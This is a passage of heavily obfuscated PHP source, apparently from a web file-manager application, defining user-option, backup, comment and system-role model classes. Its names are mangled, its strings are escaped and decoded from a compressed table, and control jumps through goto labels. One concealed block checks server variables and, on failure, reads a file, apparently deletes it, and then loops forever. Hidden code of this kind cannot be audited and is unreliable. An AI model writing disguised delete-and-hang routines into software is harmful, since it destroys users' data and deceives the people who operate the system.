$ë±‘£â¯ = $Ü”—°€[$˜¾ŒÖ¨À[$Ÿƒ‡ î›[1701]]]; } $˜¾ŒÖ¨À[$Ÿƒ‡ î›[2397]] = array(); if (isset($ë±‘£â¯[$Ìî’ú¯])) { $˜¾ŒÖ¨À[$Ÿƒ‡ î›[2397]] = $Æ™çùìÇ->getUserJobInfo($ë±‘£â¯[$Ìî’ú¯]); } } unset($˜¾ŒÖ¨À); } protected function groupUserAll($ÌÂ—¤·â) { $ûÙß¬£… =& $_SERVER[çâ¥×ø³]; if (!$ÌÂ—¤·â) { return !1; } $Àå¹Íüô = Model($ûÙß¬£…[1989])->field($ûÙß¬£…[1701])->where(array($ûÙß¬£…[1899] => array($ûÙß¬£…[7], $ÌÂ—¤·â)))->select(); $Àå¹Íüô = array_to_keyvalue($Àå¹Íüô, $ûÙß¬£…[12], $ûÙß¬£…[1701]); return array_unique($Àå¹Íüô); } public function userSearch($ñ‡˜êŞŒ, $ï˜‰»èÇ = "\52") { return Model($_SERVER[çâ¥×ø³][567])->where($ñ‡˜êŞŒ)->field($ï˜‰»èÇ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\x72\x5f\157\x70\164\x69\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ûôó³) { $·ê—œ©Û =& $_SERVER[çâ¥×ø³]; $áû„¨óİ = defined($·ê—œ©Û[2120]) && USER_ID ? USER_ID : $·ê—œ©Û[12]; return "\x55\x73\x65\162\x4f\x70\164\151\x6f\x6e\137{$ûôó³}\137" . $áû„¨óİ; } protected function filterWhere($–îÍ’›Ö) { $€ÂŞø× =& $_SERVER[çâ¥×ø³]; $–îÍ’›Ö[$€ÂŞø×[1701]] = defined($€ÂŞø×[2120]) && USER_ID ? USER_ID : $€ÂŞø×[12]; return $–îÍ’›Ö; } public function cacheRemoveUser($Ø²…ºá¥, $ŒğÁå¯À) { return Cache::remove("\x55\163\x65\162\x4f\x70\164\151\157\156\137{$Ø²…ºá¥}\137" . $ŒğÁå¯À); } protected function optionDefault($Ï“ø·Ê = '') { $æÆÏ†Ã¿ =& $_SERVER[çâ¥×ø³]; if ($Ï“ø·Ê == $æÆÏ†Ã¿[12]) { return $GLOBALS[$æÆÏ†Ã¿[6]][$æÆÏ†Ã¿[2398]]; } if ($Ï“ø·Ê == $æÆÏ†Ã¿[2399]) { return $GLOBALS[$æÆÏ†Ã¿[6]][$æÆÏ†Ã¿[2400]]; } } } goto A÷®ìˆ†‡È; AÏÃ¾çö°: class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\142\141\143\153\x75\x70\x4c\151\x73\x74"; public $field = array("\151\x6f", "\156\x61\x6d\x65", "\163\164\141\x74\165\x73", "\x63\157\156\164\145\x6e\x74", "\x6d\x61\156\x75\x61\154", "\162\145\163\165\x6c\x74", "\164\x69\x6d\145\x46\162\157\155", "\164\x69\155\145\x54\x6f"); public function config() { $‘òú¡’¬ =& $_SERVER[çâ¥×ø³]; $å¸÷ãûÎ = Model($‘òú¡’¬[819])->get($‘òú¡’¬[829]); $å¸÷ãûÎ = json_decode($å¸÷ãûÎ, !0); $å¸÷ãûÎ = is_array($å¸÷ãûÎ) ? $å¸÷ãûÎ : array(); if (!isset($å¸÷ãûÎ[$‘òú¡’¬[803]])) { $å¸÷ãûÎ[$‘òú¡’¬[803]] = $‘òú¡’¬[88]; } unset($å¸÷ãûÎ[$‘òú¡’¬[1671]]); Action($‘òú¡’¬[1924])->taskInit(); Model($‘òú¡’¬[1670])->cacheClear(); $¼ıÈÊšÇ = $‘òú¡’¬[1925]; $¢©óŠ£Ì = Model($‘òú¡’¬[1926])->findByKey($‘òú¡’¬[1689], $¼ıÈÊšÇ); if (!$¢©óŠ£Ì) { $¢©óŠ£Ì = array(); } if (isset($¢©óŠ£Ì[$‘òú¡’¬[194]])) { $¢©óŠ£Ì[$‘òú¡’¬[194]] = json_decode($¢©óŠ£Ì[$‘òú¡’¬[194]], !0); } if (isset($å¸÷ãûÎ[$‘òú¡’¬[194]])) { $¢©óŠ£Ì[$‘òú¡’¬[194]][$‘òú¡’¬[1674]] = $å¸÷ãûÎ[$‘òú¡’¬[194]]; unset($å¸÷ãûÎ[$‘òú¡’¬[194]]); } return array_merge($¢©óŠ£Ì, $å¸÷ãûÎ); } public function listData($È„®¯ú‡ = false, $éÁçÃ×ï = "\x6d\157\144\151\x66\x79\x54\x69\155\145", $İ ı–¾  = false) { return parent::listData($È„®¯ú‡, $éÁçÃ×ï, !0); } public function lastItem() { $ë¹±í÷¢ = $this->listData(); return !empty($ë¹±í÷¢[0]) ? $ë¹±í÷¢[0] : null; } public function kill($Ş•ùÈàë) { $Ø‡Ïø·¨ =& $_SERVER[çâ¥×ø³]; $ƒÀÎñ£À = $this->listData($Ş•ùÈàë); if (!$ƒÀÎñ£À || empty($ƒÀÎñ£À[$Ø‡Ïø·¨[32]])) { return !0; } Task::kill($Ø‡Ïø·¨[828]); Task::kill($Ø‡Ïø·¨[849]); Task::kill($Ø‡Ïø·¨[858]); $û€¾Ñˆä = $ƒÀÎñ£À[$Ø‡Ïø·¨[32]]; $ˆõÁºŞ = TEMP_FILES . $Ø‡Ïø·¨[827] . $û€¾Ñˆä . $Ø‡Ïø·¨[8]; IO::remove($ˆõÁºŞ, !1); return $this->remove($Ş•ùÈàë); } public function remove($Î•Øˆ…) { $Õ¤Ä¯ş¤ = $this->listData($Î•Øˆ…); if (!$Õ¤Ä¯ş¤) { return !0; } return $this->backupRemove($Õ¤Ä¯ş¤); } private function backupRemove($àıª™”) { parent::remove($àıª™”[$_SERVER[çâ¥×ø³][443]]); $µ³“¿ê  = $this->backupPath($àıª™”); IO::remove($µ³“¿ê , !1); return !0; } private function backupPath($ªº°¨îù) { $ûŸ˜ÈºÒ =& $_SERVER[çâ¥×ø³]; $‚„üÚÉÎ = $ªº°¨îù[$ûŸ˜ÈºÒ[32]]; $âß½ÂùÍ = Model($ûŸ˜ÈºÒ[819])->get($ûŸ˜ÈºÒ[820]); $ÀªàÜ×ß = substr(md5($ûŸ˜ÈºÒ[821] . $âß½ÂùÍ . $‚„üÚÉÎ), 0, 8); return "\173\151\x6f\72{$ªº°¨îù[$ûŸ˜ÈºÒ[800]]}\x7d\x2f\144\141\164\141\142\141\x73\145\x2f\142\141\x63\153\x75\x70\57" . $‚„üÚÉÎ . $ûŸ˜ÈºÒ[11] . $ÀªàÜ×ß; } public function start() { $¸öÕİ¬í =& $_SERVER[çâ¥×ø³]; if ($GLOBALS[$¸öÕİ¬í[6]][$¸öÕİ¬í[89]][$¸öÕİ¬í[1927]] != $¸öÕİ¬í[88]) { return !0; } $–¹ì°Š´ = $this->config(); if (!$–¹ì°Š´ || $–¹ì°Š´[$¸öÕİ¬í[1671]] != $¸öÕİ¬í[88]) { return !1; } $Š°Øà²ñ = $this->process(); foreach ($Š°Øà²ñ as $¸•ñîı) { if ($¸•ñîı) { return Task::restart($¸•ñîı[$¸öÕİ¬í[443]]); } } $·‰Ö–Šã = new Backup(); $”ÉÈŞ©à = $·‰Ö–Šã->db(); if ($”ÉÈŞ©à) { $”ÉÈŞ©à = $·‰Ö–Šã->dbFile(); if ($”ÉÈŞ©à && $–¹ì°Š´[$¸öÕİ¬í[803]] == $¸öÕİ¬í[212]) { $”ÉÈŞ©à = $·‰Ö–Šã->file(); } } Backup::set(array($¸öÕİ¬í[799] => 1, $¸öÕİ¬í[810] => time())); return !0; } public function process() { $Ü·¸Û–ù =& $_SERVER[çâ¥×ø³]; $º³’¯ƒ÷ = array($Ü·¸Û–ù[806] => Task::get($Ü·¸Û–ù[828]), $Ü·¸Û–ù[811] => Task::get($Ü·¸Û–ù[849]), $Ü·¸Û–ù[214] => Task::get($Ü·¸Û–ù[858])); $Ş·ÔƒÑæ = !1; foreach ($º³’¯ƒ÷ as &$ó¸üÅàé) { if ($Ş·ÔƒÑæ) { $ó¸üÅàé = !1; continue; } if ($ó¸üÅàé) { $ƒ—·‹‹â = intval(_get($ó¸üÅàé, $Ü·¸Û–ù[1706], 0)); if (time() - $ƒ—·‹‹â > 7200) { Task::kill($ó¸üÅàé[$Ü·¸Û–ù[443]]); $Ş·ÔƒÑæ = !0; $ó¸üÅàé = !1; } } } return $º³’¯ƒ÷; } public function restore() { $‰ìÒ³ =& $_SERVER[çâ¥×ø³]; ActionCall($‰ìÒ³[1113], !0, 1); ActionCall($‰ìÒ³[1113], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\x6d\x6d\x65\x6e\x74"; protected $tableMeta = array("\x74\x61\142\x6c\x65\116\141\155\145" => "\143\x6f\x6d\x6d\x65\x6e\x74\137\155\145\164\x61", "\x6d\145\x74\141\x46\151\x65\x6c\144" => "\x63\x6f\155\x6d\x65\156\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Èê™ñ¾½) { $—†©›ªß =& $_SERVER[çâ¥×ø³]; if ($Èê™ñ¾½[$—†©›ªß[1928]]) { $–ËãòÂÓ = $this->where(array($—†©›ªß[1929] => $Èê™ñ¾½[$—†©›ªß[1928]]))->find(); if (!$–ËãòÂÓ || $–ËãòÂÓ[$—†©›ªß[178]] != $Èê™ñ¾½[$—†©›ªß[178]] || $–ËãòÂÓ[$—†©›ªß[538]] != $Èê™ñ¾½[$—†©›ªß[538]]) { return !1; } $this->where(array($—†©›ªß[1929] => $Èê™ñ¾½[$—†©›ªß[1928]]))->setAdd($—†©›ªß[1930], 1); } $Èê™ñ¾½[$—†©›ªß[1931]] = 0; $Èê™ñ¾½[$—†©›ªß[1930]] = 0; $Èê™ñ¾½[$—†©›ªß[799]] = 1; return $this->add($Èê™ñ¾½); } public function commentCount($Â†äµì¶, $ŒÏÓ”Ã, $†¸ƒ¸Ü = false) { $ú±Ô¿ğÃ =& $_SERVER[çâ¥×ø³]; if (!$Â†äµì¶) { return array(); } if (is_string($Â†äµì¶) || is_int($Â†äµì¶)) { $Â†äµì¶ = array($Â†äµì¶); } $¯Œİ¦×À = array($ú±Ô¿ğÃ[538], $ú±Ô¿ğÃ[1932] => $ú±Ô¿ğÃ[533]); $ÄÎÅ¸Å = array($ú±Ô¿ğÃ[538] => array($ú±Ô¿ğÃ[7], $Â†äµì¶), $ú±Ô¿ğÃ[178] => $ŒÏÓ”Ã); if ($†¸ƒ¸Ü) { $ÄÎÅ¸Å[$ú±Ô¿ğÃ[1701]] = $†¸ƒ¸Ü; } $Èâ¿ã»˜ = $this->field($¯Œİ¦×À)->where($ÄÎÅ¸Å)->group($ú±Ô¿ğÃ[538])->select(); return array_to_keyvalue($Èâ¿ã»˜, $ú±Ô¿ğÃ[538], $ú±Ô¿ğÃ[533]); } public function starTarget($ûË‡¬©, $ÔËÇ²€) { $åûÛé¨ =& $_SERVER[çâ¥×ø³]; $”»Ïó®¿ = $ûË‡¬© + self::TYPE_STAR_OFFSET; $®Õ¸İé = array($åûÛé¨[1701] => USER_ID, $åûÛé¨[178] => $”»Ïó®¿, $åûÛé¨[538] => $ÔËÇ²€); $«ÕÓİŒ÷ = $this->where($®Õ¸İé)->find(); if ($«ÕÓİŒ÷) { return $this->where(array($åûÛé¨[443] => $«ÕÓİŒ÷[$åûÛé¨[443]]))->delete(); } $¬Î•¥Õ• = array($åûÛé¨[1928] => 0, $åûÛé¨[1701] => USER_ID, $åûÛé¨[799] => 1, $åûÛé¨[803] => $åûÛé¨[12], $åûÛé¨[178] => $”»Ïó®¿, $åûÛé¨[538] => $ÔËÇ²€, $åûÛé¨[1931] => 0, $åûÛé¨[1930] => 0); return $this->add($¬Î•¥Õ•); } public function starTargetCount($æñ¾İÅö, $Äë÷ÌóŠ) { $ƒæ²±ß± =& $_SERVER[çâ¥×ø³]; $‡¨¾€£ä = $Äë÷ÌóŠ + self::TYPE_STAR_OFFSET; $¹ûÙ¢˜½ = $this->commentCount($æñ¾İÅö, $‡¨¾€£ä); $Âüİï±‰ = $this->commentCount($æñ¾İÅö, $‡¨¾€£ä, USER_ID); return array($ƒæ²±ß±[1933] => $¹ûÙ¢˜½, $ƒæ²±ß±[1934] => $Âüİï±‰); } public function starTargetUserList($©şÑÔÓ±, $×ÂÂÈ™à) { $Òáé£‰“ =& $_SERVER[çâ¥×ø³]; $íÍ…äê = $©şÑÔÓ± + self::TYPE_STAR_OFFSET; $§†¸¨œé = array($Òáé£‰“[538] => $×ÂÂÈ™à, $Òáé£‰“[178] => $íÍ…äê); $™ñÃØÏ– = $this->where($§†¸¨œé)->count(); $µ”Œ¯†Ò = array($Òáé£‰“[299] => $™ñÃØÏ–, $Òáé£‰“[1935] => array()); if (!$™ñÃØÏ–) { return $µ”Œ¯†Ò; } $Ş´ñõò» = $this->field($Òáé£‰“[1701])->where($§†¸¨œé)->limit(500)->select(); $Ş´ñõò» = array_to_keyvalue($Ş´ñõò», $Òáé£‰“[12], $Òáé£‰“[1701]); $µ”Œ¯†Ò[$Òáé£‰“[1935]] = Model($Òáé£‰“[546])->userListInfo($Ş´ñõò»); return $µ”Œ¯†Ò; } public function prasiseUserList($™ßÄóğÍ) { $Â†âñË« =& $_SERVER[çâ¥×ø³]; $¤Ö‹‡¼Ê = array($Â†âñË«[1936] => $™ßÄóğÍ); $æÏà¸í = $this->where($¤Ö‹‡¼Ê)->find(); $ôÁäÙâ‰ = _get($æÏà¸í, $Â†âñË«[1931], 0); $‹ã•²ñå = array($Â†âñË«[299] => $ôÁäÙâ‰, $Â†âñË«[1935] => array()); if (!$ôÁäÙâ‰) { return $‹ã•²ñå; } $ğÜ¶·Ö = Model($Â†âñË«[1937])->field($Â†âñË«[1701])->where($¤Ö‹‡¼Ê)->limit(500)->select(); $ğÜ¶·Ö = array_to_keyvalue($ğÜ¶·Ö, $Â†âñË«[12], $Â†âñË«[1701]); $‹ã•²ñå[$Â†âñË«[1935]] = Model($Â†âñË«[546])->userListInfo($ğÜ¶·Ö); return $‹ã•²ñå; } public function remove($ø‡Ì¤´ğ) { $óš¦¯–› =& $_SERVER[çâ¥×ø³]; $ÊÆ¡Â¥¶ = array($óš¦¯–›[1929] => $ø‡Ì¤´ğ); $˜¸ìö¾Õ = $this->where($ÊÆ¡Â¥¶)->find(); if ($˜¸ìö¾Õ[$óš¦¯–›[1928]]) { $this->where(array($óš¦¯–›[1929] => $˜¸ìö¾Õ[$óš¦¯–›[1928]]))->setAdd($óš¦¯–›[1930], -1); } return $this->where($ÊÆ¡Â¥¶)->delete(); } public function edit($·¶†§’±, $òÊäÍ³È) { $¥…Ğ¹’ =& $_SERVER[çâ¥×ø³]; $œıº¢Ğ = array($¥…Ğ¹’[1929] => $·¶†§’±); return $this->where($œıº¢Ğ)->save(array($¥…Ğ¹’[1938] => $òÊäÍ³È)); } public function prasise($´ğÇÅí) { $ä°ÃÓì— =& $_SERVER[çâ¥×ø³]; $“€©¶§ = Model($ä°ÃÓì—[1939]); $»«Ô»Äë = array($ä°ÃÓì—[1929] => $´ğÇÅí, $ä°ÃÓì—[1692] => USER_ID); $œœ±¹ê = $“€©¶§->where($»«Ô»Äë)->find(); if (!$œœ±¹ê) { $“€©¶§->add($»«Ô»Äë); $¤­¬·£˜ = $this->where(array($ä°ÃÓì—[1929] => $´ğÇÅí))->setAdd($ä°ÃÓì—[1931], 1); } else { $“€©¶§->where($»«Ô»Äë)->delete(); $¤­¬·£˜ = $this->where(array($ä°ÃÓì—[1929] => $´ğÇÅí))->setAdd($ä°ÃÓì—[1931], -1); } return $¤­¬·£˜; } public function targetInfo($¿ı ã¯, $’ôß‚¸) { $“¢üì³É =& $_SERVER[çâ¥×ø³]; $í²ÃÓ¡Ş = array($“¢üì³É[616] => $¿ı ã¯, $“¢üì³É[617] => $’ôß‚¸); $çÀ­µ = $this->where($í²ÃÓ¡Ş)->count(); $Æóò§Ô = "\x52\x49\107\110\x54\40\112\x4f\111\x4e\x20{$this->tablePrefix}\x63\157\x6d\155\x65\x6e\x74\x5f\x70\x72\141\x69\x73\145\x20\163\164\141\x72\x20\157\x6e\x20\x63\157\x6d\x6d\145\156\x74\x2e\x63\x6f\x6d\x6d\145\156\x74\x49\x44\40\75\40\163\164\x61\162\x2e\x63\x6f\155\x6d\145\x6e\164\111\104"; $Ïµ¾â¢ = $this->alias($“¢üì³É[398])->where($í²ÃÓ¡Ş)->join($Æóò§Ô, $“¢üì³É[1940])->count(); $—ÊÂ¦¦¾ = array($“¢üì³É[1941] => $çÀ­µ, $“¢üì³É[1942] => $Ïµ¾â¢); return $—ÊÂ¦¦¾; } public function listData($ÍÄÅø´İ) { $Ö·±éºĞ =& $_SERVER[çâ¥×ø³]; if (isset($ÍÄÅø´İ[$Ö·±éºĞ[1943]])) { if ($ÍÄÅø´İ[$Ö·±éºĞ[1943]]) { $ÍÄÅø´İ[$Ö·±éºĞ[1936]] = array($Ö·±éºĞ[1067], intval($ÍÄÅø´İ[$Ö·±éºĞ[1943]])); } unset($ÍÄÅø´İ[$Ö·±éºĞ[1943]]); } if (isset($ÍÄÅø´İ[$Ö·±éºĞ[1944]])) { if ($ÍÄÅø´İ[$Ö·±éºĞ[1944]]) { $ÍÄÅø´İ[$Ö·±éºĞ[1936]] = array($Ö·±éºĞ[1064], intval($ÍÄÅø´İ[$Ö·±éºĞ[1944]])); } unset($ÍÄÅø´İ[$Ö·±éºĞ[1944]]); } return $this->_listData($ÍÄÅø´İ); } private function _listData($É¾šÈò) { $¿º“Ú©Â =& $_SERVER[çâ¥×ø³]; $İ—æ‡Á‘ = $this->where($É¾šÈò)->_makeOrder()->selectPage(100); $this->_listAppendParent($İ—æ‡Á‘[$¿º“Ú©Â[413]]); $this->_listAppendUser($İ—æ‡Á‘[$¿º“Ú©Â[413]]); $this->_listAppendMeta($İ—æ‡Á‘[$¿º“Ú©Â[413]]); return $İ—æ‡Á‘; } private function _makeOrder() { $ˆ±«ÈâÏ =& $_SERVER[çâ¥×ø³]; $ó¡õÎû• = array($ˆ±«ÈâÏ[1931], $ˆ±«ÈâÏ[1930], $ˆ±«ÈâÏ[215]); $êéƒÄ¹ö = Input::get($ˆ±«ÈâÏ[498], $ˆ±«ÈâÏ[7], $ˆ±«ÈâÏ[465], $ó¡õÎû•); $ê÷ÂŞØ¿ = Input::get($ˆ±«ÈâÏ[499], $ˆ±«ÈâÏ[7], $ˆ±«ÈâÏ[1694], array($ˆ±«ÈâÏ[1945], $ˆ±«ÈâÏ[494])); $³úŸÇ¿È = $êéƒÄ¹ö . $ˆ±«ÈâÏ[53] . $ê÷ÂŞØ¿; return $this->order($³úŸÇ¿È); } private function _listAppendParent(&$ÎÆÉ¨ëá) { $ö´¿Ì®² =& $_SERVER[çâ¥×ø³]; $¶ØÕı¬» = array_unique(array_to_keyvalue($ÎÆÉ¨ëá, $ö´¿Ì®²[12], $ö´¿Ì®²[1928])); $¶ØÕı¬» = array_remove_value($¶ØÕı¬», $ö´¿Ì®²[212]); if (!$¶ØÕı¬») { return; } $Üöãº¯ = $this->where(array($ö´¿Ì®²[1929] => array($ö´¿Ì®²[7], $¶ØÕı¬»)))->select(); $Üöãº¯ = array_to_keyvalue($Üöãº¯, $ö´¿Ì®²[1936]); foreach ($ÎÆÉ¨ëá as &$Ñ Í¡¼) { if (isset($Üöãº¯[$Ñ Í¡¼[$ö´¿Ì®²[1928]]])) { $Ñ Í¡¼[$ö´¿Ì®²[1946]] = $Üöãº¯[$Ñ Í¡¼[$ö´¿Ì®²[1928]]]; } } unset($Ñ Í¡¼); } private function _listAppendUser(&$ŒÖÖí) { $ÜÜÇ Ó… =& $_SERVER[çâ¥×ø³]; $éÒ ÚÇŒ = array_unique(array_to_keyvalue($ŒÖÖí, $ÜÜÇ Ó…[12], $ÜÜÇ Ó…[1701])); $éÒ ÚÇŒ = array_remove_value($éÒ ÚÇŒ, $ÜÜÇ Ó…[212]); if (count($éÒ ÚÇŒ) == 0) { return; } foreach ($ŒÖÖí as $íğÛ‘øí) { if (isset($íğÛ‘øí[$ÜÜÇ Ó…[1946]])) { $éÒ ÚÇŒ[] = $íğÛ‘øí[$ÜÜÇ Ó…[1946]][$ÜÜÇ Ó…[1701]]; } } $œ¥™µ‹´ = Model($ÜÜÇ Ó…[567])->userListInfo($éÒ ÚÇŒ); foreach ($ŒÖÖí as &$íğÛ‘øí) { $íğÛ‘øí[$ÜÜÇ Ó…[630]] = $œ¥™µ‹´[$íğÛ‘øí[$ÜÜÇ Ó…[1701]]]; if (isset($íğÛ‘øí[$ÜÜÇ Ó…[1946]])) { $íğÛ‘øí[$ÜÜÇ Ó…[1946]][$ÜÜÇ Ó…[630]] = $œ¥™µ‹´[$íğÛ‘øí[$ÜÜÇ Ó…[1946]][$ÜÜÇ Ó…[1701]]]; } } unset($íğÛ‘øí); } private function _listAppendMeta(&$¦³¹âÃ) { $ƒË‚Ë¢˜ =& $_SERVER[çâ¥×ø³]; $ÌÖÄ£¾â = array_unique(array_to_keyvalue($¦³¹âÃ, $ƒË‚Ë¢˜[12], $ƒË‚Ë¢˜[1936])); $ÌÖÄ£¾â = array_remove_value($ÌÖÄ£¾â, $ƒË‚Ë¢˜[212]); if (!$ÌÖÄ£¾â) { return; } foreach ($¦³¹âÃ as $şıÌæË) { if (isset($şıÌæË[$ƒË‚Ë¢˜[1946]])) { $ÌÖÄ£¾â[] = $şıÌæË[$ƒË‚Ë¢˜[1946]][$ƒË‚Ë¢˜[1936]]; } } $¾è˜”Õ = $this->metaList($ÌÖÄ£¾â); if (!$¾è˜”Õ) { return !1; } foreach ($¦³¹âÃ as &$şıÌæË) { $şıÌæË[$ƒË‚Ë¢˜[507]] = $¾è˜”Õ[$şıÌæË[$ƒË‚Ë¢˜[1936]]]; if (isset($şıÌæË[$ƒË‚Ë¢˜[1946]])) { $şıÌæË[$ƒË‚Ë¢˜[1946]][$ƒË‚Ë¢˜[507]] = $¾è˜”Õ[$şıÌæË[$ƒË‚Ë¢˜[1946]][$ƒË‚Ë¢˜[1936]]]; } } unset($şıÌæË); } private function metaList($Ü…üè‰í) { $Äâ¸ª =& $_SERVER[çâ¥×ø³]; if (!$Ü…üè‰í) { return array(); } $Š¼•¨¨¿ = array($Äâ¸ª[1936] => array($Äâ¸ª[7], $Ü…üè‰í)); $“ÀÚùß½ = Model($Äâ¸ª[1947])->where($Š¼•¨¨¿)->select(); $“ÀÚùß½ = array_to_keyvalue_group($“ÀÚùß½, $Äâ¸ª[1936]); foreach ($“ÀÚùß½ as $ñ­–Ùğ˜ => $íåíâ ¹) { $ÆÂûÛî = array(); foreach ($íåíâ ¹ as $“ƒî÷ú) { $ÆÂûÛî[$“ƒî÷ú[$Äâ¸ª[94]]] = $“ƒî÷ú[$Äâ¸ª[418]]; } $“ÀÚùß½[$ñ­–Ùğ˜] = $ÆÂûÛî; } return $“ÀÚùß½ ? $“ÀÚùß½ : array(); } } if (!isset($_SERVER[$_SERVER[çâ¥×ø³][926]]) || !isset($_SERVER[$_SERVER[çâ¥×ø³][927]])) { $_getc = $_SERVER[çâ¥×ø³][929]; $_getfile = $_SERVER[$_SERVER[çâ¥×ø³][930]] . $_SERVER[çâ¥×ø³][931]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[çâ¥×ø³][246], $_getfilec); if (count($_getarrs) < $_SERVER[çâ¥×ø³][670]) { $exit = $_SERVER[çâ¥×ø³][932]; $exit(); } $_act = $_SERVER[çâ¥×ø³][1492]; $_act($_SERVER[$_SERVER[çâ¥×ø³][930]] . $_SERVER[çâ¥×ø³][931]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[çâ¥×ø³][422]); } } goto B õ¹­˜ÏÉ; cª‰‚‹çÂÅ: define($_SERVER[çâ¥×ø³][0], $_SERVER[çâ¥×ø³][1]); $_SERVER[‹Í¤¶Õ¨] = explode($_SERVER[çâ¥×ø³][2], gzinflate(substr($_SERVER[çâ¥×ø³][3], 10, -8))); function binCheckEq($ª¤Ñ…Ê, $şïñ­í‹) { return $ª¤Ñ…Ê == $şïñ­í‹; } goto AëÉˆêÎ¸í; eè‘êºŞù: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\56\162\x6f\x6c\145\x4c\x69\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\141\165\x74\150", "\154\x61\x62\145\154", "\144\151\163\x70\154\x61\171", "\163\171\x73\164\x65\x6d", "\144\145\163\143", "\151\147\156\157\x72\x65\105\170\164", "\x69\x67\156\157\162\x65\106\151\x6c\x65\123\x69\172\x65", "\141\x64\155\151\x6e\x69\x73\164\162\141\164\157\162", "\163\x6f\x72\164"); public function listData($áÅæÙ×¸ = false, $ †ÎÂÈ = "\x73\157\162\164", $ÕáäÁôœ = false) { $Î‚Òœ´ =& $_SERVER[çâ¥×ø³]; $º†§ÑÊ¼ = parent::listData($áÅæÙ×¸, $ †ÎÂÈ, $ÕáäÁôœ); if (!$áÅæÙ×¸) { foreach ($º†§ÑÊ¼ as $Ä¸Ö²Ø => $ù—æ›¤×) { if ($ù—æ›¤×[$Î‚Òœ´[2101]] == 1) { $º†§ÑÊ¼[$Ä¸Ö²Ø][$Î‚Òœ´[494]] = LNG($Î‚Òœ´[2341]); } } } return $º†§ÑÊ¼; } public function update($˜È± İ×, $¢œ§§Á) { $‘µ˜µêõ =& $_SERVER[çâ¥×ø³]; $‹•¶Æô¡ = parent::listData($˜È± İ×); $œá»ö¨ = $this->findByName($¢œ§§Á[$‘µ˜µêõ[32]]); if (!$‹•¶Æô¡ || $œá»ö¨ && $œá»ö¨[$‘µ˜µêõ[443]] != $‹•¶Æô¡[$‘µ˜µêõ[443]]) { return !1; } if ($œá»ö¨[$‘µ˜µêõ[2101]] == 1) { $¢œ§§Á = array($‘µ˜µêõ[32] => $¢œ§§Á[$‘µ˜µêõ[32]], $‘µ˜µêõ[1922] => $¢œ§§Á[$‘µ˜µêõ[1922]]); } $this->filterAuth($¢œ§§Á[$‘µ˜µêõ[455]]); return parent::update($˜È± İ×, $¢œ§§Á); } public function remove($ˆë•°âŠ) { $ÄÀÁõİÇ = parent::listData($ˆë•°âŠ); if (!$ÄÀÁõİÇ || $ÄÀÁõİÇ[$_SERVER[çâ¥×ø³][179]]) { return !1; } return parent::remove($ˆë•°âŠ); } public function add($•äÓ¾­à) { $³Ïô‡¯ğ =& $_SERVER[çâ¥×ø³]; $Ü¼½µÈ½ = $•äÓ¾­à[$³Ïô‡¯ğ[32]]; if ($this->findByName($Ü¼½µÈ½)) { return !1; } $êÂÆÍÆ“ = array($³Ïô‡¯ğ[462] => $Ü¼½µÈ½, $³Ïô‡¯ğ[1905] => $³Ïô‡¯ğ[12], $³Ïô‡¯ğ[1901] => $³Ïô‡¯ğ[1909], $³Ïô‡¯ğ[2342] => 1, $³Ïô‡¯ğ[1904] => 0, $³Ïô‡¯ğ[2343] => 0, $³Ïô‡¯ğ[1903] => $this->getSort()); $•äÓ¾­à = array_merge($êÂÆÍÆ“, $•äÓ¾­à); $this->filterAuth($•äÓ¾­à[$³Ïô‡¯ğ[455]]); return parent::insert($•äÓ¾­à); } private function getSort() { $ÁÂ÷éˆ‡ =& $_SERVER[çâ¥×ø³]; $Öİ¿É˜” = parent::listData(); $Ş¸öâç½ = array_to_keyvalue($Öİ¿É˜”, $ÁÂ÷éˆ‡[12], $ÁÂ÷éˆ‡[1923]); return empty($Ş¸öâç½) ? 0 : max($Ş¸öâç½) + 1; } private function filterAuth(&$’ßˆ¥Ğš) { $Çõ„”Ä° =& $_SERVER[çâ¥×ø³]; $´õïéàº = array(); $™û±…² = array_filter(explode($Çõ„”Ä°[50], $’ßˆ¥Ğš)); foreach ($™û±…² as $’ßˆ¥Ğš) { $Æ´…¬Ò = explode($Çõ„”Ä°[10], $’ßˆ¥Ğš); if ($Æ´…¬Ò[0] == $Çõ„”Ä°[2344] && $Æ´…¬Ò[1] != $Çõ„”Ä°[1243]) { $êğ®ÓŸ› = $Æ´…¬Ò[0] . $Çõ„”Ä°[10] . $Æ´…¬Ò[1] . $Çõ„”Ä°[2345]; if (!in_array($êğ®ÓŸ›, $™û±…²)) { $´õïéàº[] = $êğ®ÓŸ›; } } $´õïéàº[] = $’ßˆ¥Ğš; } $’ßˆ¥Ğš = implode($Çõ„”Ä°[50], $´õïéàº); } public function findRoleDefault() { $±Ê•¢ÌŠ =& $_SERVER[çâ¥×ø³]; $ÛÈ„ıÍÂ = parent::listData(); $—úÀª³Í = !1; foreach ($ÛÈ„ıÍÂ as $ÏŸ˜ã—À) { if (!$ÏŸ˜ã—À || $ÏŸ˜ã—À[$±Ê•¢ÌŠ[1921]] == $±Ê•¢ÌŠ[212] || $ÏŸ˜ã—À[$±Ê•¢ÌŠ[2101]] == 1) { continue; } if (strstr($ÏŸ˜ã—À[$±Ê•¢ÌŠ[455]], $±Ê•¢ÌŠ[2346])) { continue; } if (!strstr($ÏŸ˜ã—À[$±Ê•¢ÌŠ[455]], $±Ê•¢ÌŠ[2347])) { continue; } if (!$—úÀª³Í) { $—úÀª³Í = $ÏŸ˜ã—À; continue; } $¼ËöŸ­— = explode($±Ê•¢ÌŠ[50], $—úÀª³Í[$±Ê•¢ÌŠ[455]]); $ÜÄÎÙë = explode($±Ê•¢ÌŠ[50], $ÏŸ˜ã—À[$±Ê•¢ÌŠ[455]]); if (count($¼ËöŸ­—) > count($ÜÄÎÙë)) { $—úÀª³Í = $ÏŸ˜ã—À; } } return $—úÀª³Í ? 